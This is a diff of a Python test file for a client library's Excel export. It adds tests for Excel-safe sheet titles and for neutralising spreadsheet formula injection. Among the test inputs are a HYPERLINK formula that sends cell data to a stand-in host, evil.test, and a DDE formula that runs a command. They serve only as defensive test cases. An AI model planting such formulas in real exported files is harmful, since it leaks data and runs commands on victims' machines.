@@ -6,19 +6,81 @@ from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock
 
 import httpx
+import pytest
+from openpyxl import Workbook
 
-from kahunas_client.mcp.export import ExportManager, _sanitize_name
+from kahunas_client.mcp.export import (
+    ExportManager,
+    _cell,
+    _neutralise_formula,
+    _sheet_title,
+    _titled_sheet,
+)
 
 
-class TestSanitizeName:
+class TestSheetTitle:
+    """Worksheet titles must satisfy Excel's stricter naming rules."""
+
     def test_clean_name(self) -> None:
-        assert _sanitize_name("John Doe") == "John Doe"
+        assert _sheet_title("John Doe") == "John Doe"
 
-    def test_special_chars(self) -> None:
-        assert _sanitize_name('a<b>c:d"e') == "a_b_c_d_e"
+    def test_replaces_characters_excel_rejects(self) -> None:
+        assert _sheet_title("a[b]c:d*e?f/g\\h") == "a_b_c_d_e_f_g_h"
 
-    def test_trailing_dot(self) -> None:
-        assert _sanitize_name("test.") == "test"
+    def test_truncates_to_excel_limit(self) -> None:
+        assert len(_sheet_title("x" * 60)) == 31
+
+    def test_falls_back_when_nothing_survives(self) -> None:
+        assert _sheet_title("", fallback="Rest Day") == "Rest Day"
+        assert _sheet_title(":::", fallback="Rest Day") == "Rest Day"
+
+    def test_accepted_by_openpyxl(self) -> None:
+        """The point of the stricter rules is that openpyxl will not reject them."""
+        wb = Workbook()
+        sheet = _titled_sheet(wb, _sheet_title("Day 1: Push/Pull [A]*"))
+        assert sheet.title == "Day 1_ Push_Pull _A__"
+
+
+class TestFormulaInjection:
+    """Client supplied text must not be evaluated as a spreadsheet formula."""
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "=1+1",
+            '=HYPERLINK("http://evil.test?d="&A1,"click")',
+            "+1+1",
+            "-1+1",
+            "@SUM(A1)",
+            "\tvalue",
+            "\rvalue",
+        ],
+    )
+    def test_dangerous_prefixes_are_neutralised(self, payload: str) -> None:
+        neutralised = _neutralise_formula(payload)
+        assert neutralised == f"'{payload}"
+        assert not str(neutralised).startswith(("=", "+", "-", "@", "\t", "\r"))
+
+    @pytest.mark.parametrize("value", ["John Doe", "", "note about -5 kg", "3 = 3"])
+    def test_ordinary_text_is_untouched(self, value: str) -> None:
+        assert _neutralise_formula(value) == value
+
+    @pytest.mark.parametrize("value", [1, 2.5, None, True])
+    def test_non_strings_stay_typed(self, value: object) -> None:
+        """Genuine numbers must remain numeric, not become quoted text."""
+        assert _neutralise_formula(value) is value
+
+    def test_cell_writes_go_through_the_mitigation(self) -> None:
+        wb = Workbook()
+        ws = _titled_sheet(wb, "Data")
+        _cell(ws, row=1, column=1, value="=cmd|'/c calc'!A1")
+        assert ws.cell(row=1, column=1).value == "'=cmd|'/c calc'!A1"
+
+    def test_cell_preserves_numeric_values(self) -> None:
+        wb = Workbook()
+        ws = _titled_sheet(wb, "Data")
+        _cell(ws, row=1, column=1, value=82.5)
+        assert ws.cell(row=1, column=1).value == 82.5
 
 
 class TestExportManager:
